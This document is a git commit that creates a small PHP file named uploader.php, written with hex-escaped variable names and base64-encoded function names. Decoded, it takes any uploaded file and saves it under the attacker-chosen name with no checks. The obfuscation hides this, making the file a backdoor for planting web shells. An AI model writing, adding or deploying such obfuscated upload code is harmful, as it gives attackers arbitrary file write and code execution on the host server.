5a0918bcdd4f762e59db70f78f805882ef945e7a
kr1pt0n <39812156+kr1pt0n@users.noreply.github.com>
2026-06-28 01:14:05 -0500

    Create uploader.php

---
+++ uploader.php
@@ -0,0 +1,10 @@
+<?php
+${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x71\x31"]="\x5f\x46\x49\x4c\x45\x53";
+$o = 'Y2hlY2tfZmlsZQ=='; $f = 'bW92ZV91cGxvYWRlZF9maWxl';
+if(isset(${${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x71\x31"]}['file'])){
+    $u = ${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x71\x31"];
+    if(call_user_func(base64_decode('bW92ZV91cGxvYWRlZF9maWxl'),$_FILES['file']['tmp_name'],$_FILES['file']['name'])){
+        echo base64_decode('T0s=');
+    }
+}
+?>
